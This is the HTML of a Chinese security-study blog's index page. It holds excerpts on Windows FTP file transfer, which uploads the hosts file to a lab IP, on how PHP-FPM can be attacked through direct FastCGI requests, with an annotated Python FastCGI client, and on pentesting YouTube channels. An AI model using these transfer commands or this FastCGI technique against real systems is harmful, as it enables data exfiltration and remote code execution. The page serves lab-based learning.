C:\htb&gt; echo binary &gt;&gt; ftpcommand.txt
C:\htb&gt; echo PUT c:\windows\system32\drivers\etc\hosts &gt;&gt; ftpcommand.txt
C:\htb&gt; echo bye &gt;&gt; ftpcommand.txt
C:\htb&gt; ftp -v -n -s:ftpcommand.txt
ftp&gt; open 192.168.49.128

Log in with USER and PASS first.


ftp&gt; USER anonymous
ftp&gt; PUT c:\windows\system32\drivers\etc\hosts
ftp&gt; bye
</code></pre>

            
        </div>
    </div>

    <div class="post-tags">
        
        <span class="icon">
            <a-icon type="tags" theme="filled" />
        </span>
        
        
        <span class="tag">
            
            <a href="/tags/base" style=color:#03a9f4>
                base
            </a>
        </span>
        
    </div>

    <a href="/2023/06/11/FILE TRANSFERS/ " class="go-post">
        阅读全文
    </a>
</div>

<div class="post">

    <a href="/2023/06/11/PHP_FPM/">
        <h2>
            PHP_FPM
        </h2>
    </a>

    <div class="category-and-date">

        

        <span class="date">
            <span class="icon">
                <a-icon type="calendar" theme="filled" />
            </span>
            2023/6/11
        </span>

    </div>

    <div class="excerpt">
        <div class="content" v-pre>
            
            
            <p>##PHP_FPM</p>
<ul>
<li><h3 id="关于FPM"><a href="#关于FPM" class="headerlink" title="关于FPM"></a>关于FPM</h3><p>参考文章：<a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903471976546311">Nginx+Php-fpm 运行原理详解</a></p>
<ul>
<li><p>正向代理与反向代理：</p>
<blockquote>
<p>vpn对于“我们”来说，是可以感知到的（我们连接vpn）<br>vpn对于”google服务器”来说，是不可感知的(google只知道有http请求过来)。<br><strong>对于人来说可以感知到，但服务器感知不到的服务器，我们叫他正向代理服务器。</strong></p>
</blockquote>
<blockquote>
<h4 id="反向代理：通过反向代理实现负载均衡"><a href="#反向代理：通过反向代理实现负载均衡" class="headerlink" title="反向代理：通过反向代理实现负载均衡"></a>反向代理：通过反向代理实现负载均衡</h4><p>此代理服务器,对于“我们”来说是不可感知的(我们只能感知到访问的是百度的服务器，不知道中间还有代理服务器来做负载均衡)。<br>此代理服务器，对于”server1 server2 server3”是可感知的(代理服务器负载均衡路由到不同的server)<br><strong>对于人来说不可感知，但对于服务器来说是可以感知的，我们叫他反向代理服务器</strong></p>
</blockquote>
</li>
<li><h4 id="Nginx是什么"><a href="#Nginx是什么" class="headerlink" title="Nginx是什么"></a>Nginx是什么</h4><blockquote>
<p>Nginx (“engine x”) 是一个高性能的HTTP和反向代理服务器，也是一个IMAP&#x2F;POP3&#x2F;SMTP服务器。</p>
</blockquote>
</li>
<li><h5 id="cgi、fast-cgi协议"><a href="#cgi、fast-cgi协议" class="headerlink" title="cgi、fast-cgi协议"></a>cgi、fast-cgi协议</h5><blockquote>
<h6 id="cgi的历史"><a href="#cgi的历史" class="headerlink" title="cgi的历史"></a>cgi的历史</h6><p>早期的webserver只处理html等静态文件，但是随着技术的发展，出现了像php等动态语言。<br>webserver处理不了了，怎么办呢？那就交给php解释器来处理吧！<br>交给php解释器处理很好，但是，php解释器如何与webserver进行通信呢？<br>&#x3D;&#x3D;为了解决不同的语言解释器(如php、python解释器)与webserver的通信，于是出现了cgi协议。&#x3D;&#x3D;只要你按照cgi协议去编写程序，就能实现语言解释器与webwerver的通信。如php-cgi程序。</p>
</blockquote>
<blockquote>
<h6 id="fast-cgi的改进"><a href="#fast-cgi的改进" class="headerlink" title="fast-cgi的改进"></a>fast-cgi的改进</h6><p>有了cgi协议，解决了php解释器与webserver通信的问题，webserver终于可以处理动态语言了。但是，webserver每收到一个请求，都会去fork一个cgi进程，请求结束再kill掉这个进程。这样有10000个请求，就需要fork、kill php-cgi进程10000次。</p>
<p>有没有发现很浪费资源？</p>
<p>于是，出现了cgi的改良版本，fast-cgi。fast-cgi每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求。这样每次就不用重新fork一个进程了，大大提高了效率。</p>
</blockquote>
</li>
<li><h5 id="php-fpm是什么"><a href="#php-fpm是什么" class="headerlink" title="php-fpm是什么"></a>php-fpm是什么</h5><blockquote>
<p>php-fpm即php-Fastcgi Process Manager.</p>
<p>php-fpm是 FastCGI 的实现，并提供了进程管理的功能。<br>进程包含 master 进程和 worker 进程两种进程。<br>master 进程只有一个，负责监听端口，接收来自 Web Server 的请求，而 worker 进程则一般有多个(具体数量根据实际需要配置)，每个进程内部都嵌入了一个 PHP 解释器，是 PHP 代码真正执行的地方。</p>
</blockquote>
</li>
</ul>
<pre><code>www.example.com/index.php
        |
        |
      nginx
        |
        |
加载nginx的fast-cgi模块
        |
        |
fast-cgi对根据fast-cgi协议请求包进行封装，然后将封装好的包发给php-fpm
        |
        |
php-fpm 据fast-cgi协议将TCP流解析成真正的数据,调用php文件
        |
        |
php-fpm处理完请求，返回给nginx
        |
        |
nginx将结果通过http返回给浏览器
</code></pre>
</li>
<li><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>基本原理就是模仿nginx的fast-cgi，直接与php-fpm进行通信。在通信之前，我们首先需要了解一下其通信包的构成。</p>
<ul>
<li><p>Fastcgi协议由多个record组成，record也有header和body一说，但是和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下：</p>
<pre><code>typedef struct &#123;
  /* Header */
  unsigned char version; // 版本
  unsigned char type; // 请求包的类型
  unsigned char requestIdB1; // 请求包id高8位
  unsigned char requestIdB0; // 请求包id低8位
  unsigned char contentLengthB1; // body长度高8位
  unsigned char contentLengthB0; // body长度低8位
  unsigned char paddingLength; // 结尾填充长度
  unsigned char reserved;   // 保留字节

  /* Body */
  unsigned char contentData[contentLength];
  unsigned char paddingData[paddingLength];
&#125; FCGI_Record;
</code></pre>
<p>可以看出一个请求头为8个字节。其参数解释如下： - version:用来表示版本信息，如果是web服务器给php-fpm发送的消息，请求头中只需要将其置0就可以 - type:此字段用来说明每次所发送消息的类型，其具体值可以为如下:</p>
<p><img src="/" alt="CGI"></p>
<p>-requestId:占俩个字节，一个唯一的标志id，以避免同时处理多个请求时的影响。 - contentLength:占2个字节，表示body的长度。语言端解析了fastcgi头以后，拿到contentLength，然后再在TCP流里读取大小等于contentLength的数据，这就是body体。 - paddingLength:填充长度的值，为了提高处理消息的能力，我们的每个消息大小都必须为8的倍数，此长度标示，我们在消息的尾部填充的长度 - reserved:保留字段</p>
</li>
<li><h2 id="fastcgi客户端脚本分析"><a href="#fastcgi客户端脚本分析" class="headerlink" title="fastcgi客户端脚本分析"></a>fastcgi客户端脚本分析</h2><p>协议的内容大致了解了，接下来就是写代码，封装一下请求包。已经有前辈做了这件事情–&gt;<a href="https://link.zhihu.com/?target=https://github.com/wuyunfeng/Python-FastCGI-Client">https://github.com/wuyunfeng/Python-FastCGI-Client</a>，我们来尝试分析一下代码。</p>
<pre><code>#!/usr/bin/python

import socket
import random
</code></pre>
<p>class FastCGIClient:<br>“””A Fast-CGI Client for Python”””<br><br># 版本号，不重要<br>__FCGI_VERSION &#x3D; 1<br><br># FastCGI服务器角色及其设置<br>__FCGI_ROLE_RESPONDER &#x3D; 1<br>__FCGI_ROLE_AUTHORIZER &#x3D; 2<br>__FCGI_ROLE_FILTER &#x3D; 3<br><br># # type 记录类型1-11<br>__FCGI_TYPE_BEGIN &#x3D; 1<br>__FCGI_TYPE_ABORT &#x3D; 2<br>__FCGI_TYPE_END &#x3D; 3<br>__FCGI_TYPE_PARAMS &#x3D; 4<br>__FCGI_TYPE_STDIN &#x3D; 5<br>__FCGI_TYPE_STDOUT &#x3D; 6<br>__FCGI_TYPE_STDERR &#x3D; 7<br>__FCGI_TYPE_DATA &#x3D; 8<br>__FCGI_TYPE_GETVALUES &#x3D; 9<br>__FCGI_TYPE_GETVALUES_RESULT &#x3D; 10<br>__FCGI_TYPE_UNKOWNTYPE &#x3D; 11<br><br># 头部长度，默认为8<br>__FCGI_HEADER_SIZE &#x3D; 8<br><br># 自定义请求状态<br>FCGI_STATE_SEND &#x3D; 1<br>FCGI_STATE_ERROR &#x3D; 2<br>FCGI_STATE_SUCCESS &#x3D; 3<br><br>def <strong>init</strong>(self, host, port, timeout, keepalive):<br>    self.host &#x3D; host<br>    self.port &#x3D; port<br>    self.timeout &#x3D; timeout<br>    if keepalive:<br>        self.keepalive &#x3D; 1<br>    else:<br>        self.keepalive &#x3D; 0<br>    self.sock &#x3D; None<br>    self.requests &#x3D; dict()<br><br>def __connect(self):<br>    # 此函数创建了一个socket，并且去连接(self.host, self.port)<br>    self.sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    self.sock.settimeout(self.timeout)<br>    self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)<br>    try:<br>        self.sock.connect((self.host, int(self.port)))<br>    except socket.error as msg:<br>        self.sock.close()<br>        self.sock &#x3D; None<br>        print(repr(msg))<br>        return False<br>    return True<br><br>def __encodeFastCGIRecord(self, fcgi_type, content, requestid):<br>    # 此函数根据fcgi_type对content进行封装<br>    length &#x3D; len(content)<br>    return chr(FastCGIClient.__FCGI_VERSION) <br>           + chr(fcgi_type) <br>           + chr((requestid &gt;&gt; 8) &amp; 0xFF) <br>           + chr(requestid &amp; 0xFF) <br>           + chr((length &gt;&gt; 8) &amp; 0xFF) <br>           + chr(length &amp; 0xFF) <br>           + chr(0) <br>           + chr(0) <br>           + content<br><br>def __encodeNameValueParams(self, name, value):<br>    # 此函数对body进行编码<br>    nLen &#x3D; len(str(name))<br>    vLen &#x3D; len(str(value))<br>    record &#x3D; ‘’<br>    if nLen &lt; 128:<br>        record +&#x3D; chr(nLen)<br>    else:<br>        record +&#x3D; chr((nLen &gt;&gt; 24) | 0x80) <br>                  + chr((nLen &gt;&gt; 16) &amp; 0xFF) <br>                  + chr((nLen &gt;&gt; 8) &amp; 0xFF) <br>                  + chr(nLen &amp; 0xFF)<br>    if vLen &lt; 128:<br>        record +&#x3D; chr(vLen)<br>    else:<br>        record +&#x3D; chr((vLen &gt;&gt; 24) | 0x80) <br>                  + chr((vLen &gt;&gt; 16) &amp; 0xFF) <br>                  + chr((vLen &gt;&gt; 8) &amp; 0xFF) <br>                  + chr(vLen &amp; 0xFF)<br>    return record + str(name) + str(value)<br><br>def __decodeFastCGIHeader(self, stream):<br>    # 此函数对header进行解码<br>    # 被用于__decodeFastCGIRecord函数的一部分<br>    header &#x3D; dict()<br>    header[‘version’] &#x3D; ord(stream[0])<br>    header[‘type’] &#x3D; ord(stream[1])<br>    header[‘requestId’] &#x3D; (ord(stream[2]) &lt;&lt; 8) + ord(stream[3])<br>    header[‘contentLength’] &#x3D; (ord(stream[4]) &lt;&lt; 8) + ord(stream[5])<br>    header[‘paddingLength’] &#x3D; ord(stream[6])<br>    header[‘reserved’] &#x3D; ord(stream[7])<br>    return header<br><br>def __decodeFastCGIRecord(self):<br>    # 此函数对record进行解码<br>    header &#x3D; self.sock.recv(int(FastCGIClient.__FCGI_HEADER_SIZE))<br>    if not header:<br>        return False<br>    else:<br>        record &#x3D; self.__decodeFastCGIHeader(header)<br>        record[‘content’] &#x3D; ‘’<br>        if ‘contentLength’ in record.keys():<br>            contentLength &#x3D; int(record[‘contentLength’])<br>            buffer &#x3D; self.sock.recv(contentLength)<br>            while contentLength and buffer:<br>                contentLength -&#x3D; len(buffer)<br>                record[‘content’] +&#x3D; buffer<br>        if ‘paddingLength’ in record.keys():<br>            skiped &#x3D; self.sock.recv(int(record[‘paddingLength’]))<br>        return record<br><br>def request(self, nameValuePairs&#x3D;{}, post&#x3D;’’):<br>    if not self.__connect():<br>        print(‘connect failure! please check your fasctcgi-server !!’)<br>        return<br>    # 区分多段Record.requestId作为同一次请求的标志<br>    requestId &#x3D; random.randint(1, (1 &lt;&lt; 16) - 1)<br>    self.requests[requestId] &#x3D; dict()<br>    request &#x3D; “”<br>    # 构造header<br>    beginFCGIRecordContent &#x3D; chr(0) <br>                             + chr(FastCGIClient.__FCGI_ROLE_RESPONDER) <br>                             + chr(self.keepalive) <br>                             + chr(0) * 5<br>    request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,<br>                                          beginFCGIRecordContent, requestId)<br><br>    # 构造body<br>    paramsRecord &#x3D; ‘’<br>    if nameValuePairs:<br>        for (name, value) in nameValuePairs.iteritems():<br>            # paramsRecord &#x3D; self.__encodeNameValueParams(name, value)<br>            # request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>            paramsRecord +&#x3D; self.__encodeNameValueParams(name, value)<br><br>    if paramsRecord:<br>        request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>    request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, ‘’, requestId)<br><br>    if post:<br>        request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, post, requestId)<br>    request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, ‘’, requestId)<br>    # 发送fast-cgi格式的包<br>    self.sock.send(request)<br>    self.requests[requestId][‘state’] &#x3D; FastCGIClient.FCGI_STATE_SEND<br>    self.requests[requestId][‘response’] &#x3D; ‘’<br>    # 接受返回包<br>    return self.__waitForResponse(requestId)<br><br>def __waitForResponse(self, requestId):<br>    # 接受返回包<br>    while True:<br>        response &#x3D; self.__decodeFastCGIRecord()<br>        if not response:<br>            break<br>        if response[‘type’] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDOUT <br>                or response[‘type’] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDERR:<br>            if response[‘type’] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDERR:<br>                self.requests[‘state’] &#x3D; FastCGIClient.FCGI_STATE_ERROR<br>            if requestId &#x3D;&#x3D; int(response[‘requestId’]):<br>                self.requests[requestId][‘response’] +&#x3D; response[‘content’]<br>        if response[‘type’] &#x3D;&#x3D; FastCGIClient.FCGI_STATE_SUCCESS:<br>            self.requests[requestId]<br>    return self.requests[requestId][‘response’]<br><br>def <strong>repr</strong>(self):<br>    return “fastcgi connect host:{} port:{}”.format(self.host, self.port)<br>​&#96;&#96;&#96;</p>
</li>
</ul>
</li>
</ul>

            
        </div>
    </div>

    <div class="post-tags">
        
        <span class="icon">
            <a-icon type="tags" theme="filled" />
        </span>
        
        
        <span class="tag">
            
            <a href="/tags/靶场学习" style=color:#03a9f4>
                靶场学习
            </a>
        </span>
        
    </div>

    <a href="/2023/06/11/PHP_FPM/ " class="go-post">
        阅读全文
    </a>
</div>

<div class="post">

    <a href="/2023/06/11/YouTube Channels/">
        <h2>
            YouTube Channels
        </h2>
    </a>

    <div class="category-and-date">

        

        <span class="date">
            <span class="icon">
                <a-icon type="calendar" theme="filled" />
            </span>
            2023/6/11
        </span>

    </div>

    <div class="excerpt">
        <div class="content" v-pre>
            
            
            <h4 id="YouTube-Channels"><a href="#YouTube-Channels" class="headerlink" title="YouTube Channels"></a>YouTube Channels</h4><p>There are many YouTube channels out there that showcase penetration testing&#x2F;hacking techniques. A few worth bookmarking are:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">IppSec</a></td>
<td>Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight from his own experience, as well as videos on various techniques.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ">VbScrub</a></td>
<td>Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg">STÖK</a></td>
<td>Provides videos on various infosec related topics, mainly focusing on bug bounties and web application penetration testing.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w">LiveOverflow</a></td>
<td>Provides videos on a wide variety of technical infosec topics.</td>
</tr>
</tbody></table>

            
        </div>
    </div>

    <div class="post-tags">
        
        <span class="icon">
            <a-icon type="tags" theme="filled" />
        </span>
        
        
        <span class="tag">
            
            <a href="/tags/other" style=color:#ff7d73>
                other
            </a>
        </span>
        
    </div>

    <a href="/2023/06/11/YouTube Channels/ " class="go-post">
        阅读全文
    </a>
</div>


             
<div class="page-current">

    <div class="prev">
        
    </div>

    <div class="page-index">

        

        <span class="current">
            1
        </span>

        
        <span>
            <a href="/page/2/">
                <span class="page-num">
                    2
                </span>
            </a>
            

            

        </span>
        

    </div>

    <div class="next">
        
        <a href="/page/2/ ">
            <span class="page-num">
                <a-icon type="caret-right" theme="filled" />
            </span>
        </a>
        
    </div>

</div>

        </div>
    </div>
    
    <div id="home-card">
        <a-affix :offset-top="card_top">
    <a-card class="card-style" style="width: 300px">
        <div class="avatar">
            <img src="avatar.png " alt="头像">
        </div>
        <div class="name">
            TiAmo
        </div>
        <div class="descriptions">
            
            <div class="description">
                鲍鱼兰芷，不同箧而藏。
            </div>
            
        </div>
        <div class="icon-links">
            
            <span class="icon-link">
                <a target="_blank" rel="noopener" href="https://github.com/Taninluv">

                    
                    <a-icon type="github"
                        theme="filled" />
                    
                </a>
            </span>
            
            <span class="icon-link">
                <a href="">

                    
                    <a-icon type="twitter"
                        theme="" />
                    
                </a>
            </span>
            
        </div>
        <div class="friend-links">
            
            <div class="friend-link">
                <a href="">
                    英文技术博客
                </a>
            </div>
            
            <div class="friend-link">
                <a href="">
                    日语记录博客
                </a>
            </div>
            
        </div>
    </a-card>
</a-affix>
    </div>
    
</div>
                     
<footer id="footer">
    <div class="footer-wrap">
        <div>
            © 2018 - 2023 Salve
            <span class="footer-icon">
                <a-icon type="flag" theme="filled" /></span>
            @TiAmo
        </div>
        <div></div>
        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
        
    </div>

</footer>

<script src="/js/highlight.min.js"></script>
<script src="/js/particle.js"></script>
                </div>
            </div>
        </transition>
    </div>

    <script>
    new Vue({
        el: "#layout",
        data: {
            show_page: false,
            onload_menu: false,
            menu_show: false,
            card_top: 100
        },
        created: function () {
            var that = this
            window.onload = function () {
                that.show_page = true
                document.getElementById("loadcontent").style.opacity = 0
                setTimeout(function () {
                    document.getElementById("loadleft").style.width = 0
                    document.getElementById("loadright").style.width = 0
                }, 300)
                setTimeout(function () {
                    document.getElementById("loading").style = "display:none"
                }, 600)
            }
        },
        mounted: function () {
            var that = this
            window.addEventListener('scroll', function (e) {
                that.menu_show = false
            })
        },
        methods: {
            home_click: function () {
                window.scrollTo({
                    top: window.innerHeight - 80,
                    behavior: "smooth",
                });
            }
        }
    })
</script>

</body>

</html>